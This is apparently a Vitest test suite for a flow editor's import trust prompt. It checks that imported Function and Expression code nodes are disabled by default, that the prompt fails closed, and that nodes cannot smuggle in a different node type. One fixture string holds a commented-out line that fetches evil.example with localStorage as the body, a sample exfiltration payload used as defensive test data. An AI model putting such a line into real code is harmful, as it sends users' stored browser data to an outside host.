import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { setActivePinia, createPinia } from 'pinia'
import { useFlowsStore } from '@/stores/flows'
import { useNodesStore, type NodeDefinition } from '@/stores/nodes'
import {
  summarizeFlowTrust,
  needsTrustPrompt,
  requestImportTrust,
  setImportTrustResolver,
  resetImportTrustResolver,
  CODE_DISABLED_KEY,
  type FlowTrustSummary,
} from '@/services/security/flowTrust'
import { functionExecutor, expressionExecutor, CODE_DISABLED_MESSAGE } from '@/engine/executors/code'
import { createExecutionContext } from '@/engine/ExecutionEngine'

function def(id: string, extra: Partial<NodeDefinition> = {}): NodeDefinition {
  return {
    id, name: id, version: '1.0.0', category: 'code', description: '', icon: 'box',
    platforms: ['web', 'electron'], inputs: [], outputs: [], controls: [], ...extra,
  }
}

const EVIL = 'return inputs.a; // fetch("https://evil.example", {body: localStorage})'

function flowFile(nodes: Array<{ id: string; type: string; controls?: Record<string, unknown> }>): string {
  return JSON.stringify({
    format: 'latch-flow',
    formatVersion: 2,
    flow: { id: 'F', name: 'Shared', kind: 'main', nodes: nodes.map((n) => ({ version: 1, controls: {}, ...n })), edges: [] },
    layout: { nodes: Object.fromEntries(nodes.map((n) => [n.id, { x: 0, y: 0 }])) },
  })
}

function nodeData(store: ReturnType<typeof useFlowsStore>, id: string): Record<string, unknown> {
  for (const f of store.flows) {
    const n = f.nodes.find((x) => x.id === id)
    if (n) return n.data as Record<string, unknown>
  }
  throw new Error(`no node ${id}`)
}

describe('flowTrust — summary', () => {
  it('lists Function/Expression nodes with a code preview and skips comment lines', () => {
    const s = summarizeFlowTrust(
      [{ flow: { name: 'A', nodes: [
        { id: 'f', type: 'function', controls: { code: '// hi\n\nreturn 1' } },
        { id: 'e', type: 'expression', controls: { expression: 'a*2' } },
        { id: 'c', type: 'constant', controls: {} },
      ] } }],
      () => undefined,
    )
    expect(s.codeNodes.map((n) => n.type)).toEqual(['function', 'expression'])
    expect(s.codeNodes[0].preview).toBe('return 1')
    expect(needsTrustPrompt(s)).toBe(true)
  })

  it('discloses declared capabilities + shaders, and does not prompt for code-free flows', () => {
    const s = summarizeFlowTrust(
      [{ flow: { nodes: [{ id: 'm', type: 'mqtt-sub' }, { id: 's', type: 'shader' }] } }],
      (t) => (t === 'mqtt-sub' ? { connections: [{ protocol: 'mqtt' }] } : undefined),
    )
    expect(s.capabilities).toContain('Use your MQTT connections')
    expect(s.capabilities).toContain('Run custom GLSL shaders on your GPU')
    expect(needsTrustPrompt(s)).toBe(false)
  })

  it('ignores prototype-chain type names and already-disabled code nodes', () => {
    const s = summarizeFlowTrust(
      [{ flow: { nodes: [
        { id: 'x', type: 'constructor' },
        { id: 'f', type: 'function', controls: { code: 'x', [CODE_DISABLED_KEY]: true } },
      ] } }],
      () => undefined,
    )
    expect(s.codeNodes).toEqual([])
  })

  it('fails closed to "disable" when the resolver throws or returns garbage', async () => {
    const empty: FlowTrustSummary = { codeNodes: [], capabilities: [] }
    setImportTrustResolver(async () => { throw new Error('ui gone') })
    expect(await requestImportTrust(empty)).toBe('disable')
    setImportTrustResolver(async () => 'yes please' as never)
    expect(await requestImportTrust(empty)).toBe('disable')
    resetImportTrustResolver()
    expect(await requestImportTrust(empty)).toBe('disable')
  })
})

describe('flowsStore import trust prompt', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
    const nodes = useNodesStore()
    nodes.register(def('function'))
    nodes.register(def('expression'))
    nodes.register(def('constant'))
  })
  afterEach(resetImportTrustResolver)

  it('prompts for a file with code; "disable" imports with the code nodes stamped disabled', async () => {
    let seen: FlowTrustSummary | null = null
    setImportTrustResolver(async (s) => { seen = s; return 'disable' })
    const store = useFlowsStore()
    const report = await store.importFlowsWithTrustPrompt(flowFile([
      { id: 'f', type: 'function', controls: { code: EVIL } },
      { id: 'e', type: 'expression', controls: { expression: 'a+b' } },
      { id: 'c', type: 'constant' },
    ]))
    expect(seen!.codeNodes).toHaveLength(2)
    expect(report.success).toBe(true)
    expect(report.disabledCode).toBe(2)
    expect(nodeData(store, 'f')[CODE_DISABLED_KEY]).toBe(true)
    expect(nodeData(store, 'e')[CODE_DISABLED_KEY]).toBe(true)
    expect(nodeData(store, 'c')[CODE_DISABLED_KEY]).toBeUndefined()
    expect(nodeData(store, 'f').code).toBe(EVIL) // source kept for review, just not run
  })

  it('"trust" imports the code live; "cancel" imports nothing', async () => {
    const store = useFlowsStore()
    setImportTrustResolver(async () => 'cancel')
    const cancelled = await store.importFlowsWithTrustPrompt(flowFile([{ id: 'f', type: 'function', controls: { code: EVIL } }]))
    expect(cancelled.success).toBe(false)
    expect(store.flows).toHaveLength(0)

    setImportTrustResolver(async () => 'trust')
    const trusted = await store.importFlowsWithTrustPrompt(flowFile([{ id: 'f', type: 'function', controls: { code: EVIL } }]))
    expect(trusted.success).toBe(true)
    expect(nodeData(store, 'f')[CODE_DISABLED_KEY]).toBeUndefined()
  })

  it('does not prompt for a code-free file', async () => {
    let asked = false
    setImportTrustResolver(async () => { asked = true; return 'cancel' })
    const store = useFlowsStore()
    const r = await store.importFlowsWithTrustPrompt(flowFile([{ id: 'c', type: 'constant' }]))
    expect(asked).toBe(false)
    expect(r.success).toBe(true)
  })

  it('a node cannot smuggle a different nodeType (or label/definition) in via controls', async () => {
    let asked = false
    setImportTrustResolver(async () => { asked = true; return 'trust' })
    const store = useFlowsStore()
    await store.importFlowsWithTrustPrompt(flowFile([
      { id: 'x', type: 'constant', controls: { nodeType: 'function', code: EVIL, definition: { id: 'evil' }, label: 'L' } },
    ]))
    expect(asked).toBe(false) // nothing executable is declared…
    const d = nodeData(store, 'x')
    expect(d.nodeType).toBe('constant') // …and the declared type is the one that runs
    expect(d.definition).toBeUndefined()
  })

  it('direct importFlows/importFlow default to code disabled (secure by default)', () => {
    const store = useFlowsStore()
    store.importFlows(flowFile([{ id: 'f', type: 'function', controls: { code: EVIL } }]))
    expect(nodeData(store, 'f')[CODE_DISABLED_KEY]).toBe(true)
    const single = store.importFlow(flowFile([{ id: 'g', type: 'expression' }]))!
    expect((single.nodes[0].data as Record<string, unknown>)[CODE_DISABLED_KEY]).toBe(true)
  })

  it('stays disabled through export → re-import, and re-enables only on an explicit action', async () => {
    const store = useFlowsStore()
    store.importFlows(flowFile([{ id: 'f', type: 'function', controls: { code: EVIL } }]))
    const reexported = store.exportFlow()
    let asked = false
    setImportTrustResolver(async () => { asked = true; return 'trust' })
    await store.importFlowsWithTrustPrompt(reexported)
    expect(asked).toBe(false) // already-disabled nodes carry no live code → no prompt
    // and the disabled flag survived the round-trip
    expect(store.flows.every((f) => f.nodes.every((n) => (n.data as Record<string, unknown>)[CODE_DISABLED_KEY] === true))).toBe(true)

    store.activeFlowId = store.flows[0].id
    const id = store.flows[0].nodes[0].id
    // An editor echoing the SAME source back must not re-enable…
    store.updateNodeData(id, { code: EVIL })
    expect(nodeData(store, id)[CODE_DISABLED_KEY]).toBe(true)
    // …a real edit does, as does the explicit Enable action.
    store.updateNodeData(id, { code: 'return 1' })
    expect(nodeData(store, id)[CODE_DISABLED_KEY]).toBeUndefined()
    const other = store.flows[1].nodes[0].id
    expect(store.enableNodeCode(other)).toBe(true)
    expect(nodeData(store, other)[CODE_DISABLED_KEY]).toBeUndefined()
  })
})

describe('code executors honour the disabled flag', () => {
  const ctx = (controls: Record<string, unknown>) =>
    createExecutionContext({
      nodeId: 'n', inputs: new Map([['a', 2]]), controls: new Map(Object.entries(controls)),
      definition: def('function'), deltaTime: 1 / 60, totalTime: 0, frameCount: 0,
    })

  it('Function never compiles/runs disabled code', () => {
    const out = functionExecutor(ctx({ code: 'globalThis.__ran = true; return 5', [CODE_DISABLED_KEY]: true })) as Map<string, unknown>
    expect(out.get('result')).toBeNull()
    expect(out.get('error')).toBe(CODE_DISABLED_MESSAGE)
    expect((globalThis as Record<string, unknown>).__ran).toBeUndefined()
    // and the same node runs once enabled
    expect((functionExecutor(ctx({ code: 'return inputs.a * 2' })) as Map<string, unknown>).get('result')).toBe(4)
  })

  it('Expression never evaluates disabled code', () => {
    const out = expressionExecutor(ctx({ expression: 'a * 10', [CODE_DISABLED_KEY]: true })) as Map<string, unknown>
    expect(out.get('result')).toBe(0)
    expect(out.get('error')).toBe(CODE_DISABLED_MESSAGE)
  })
})
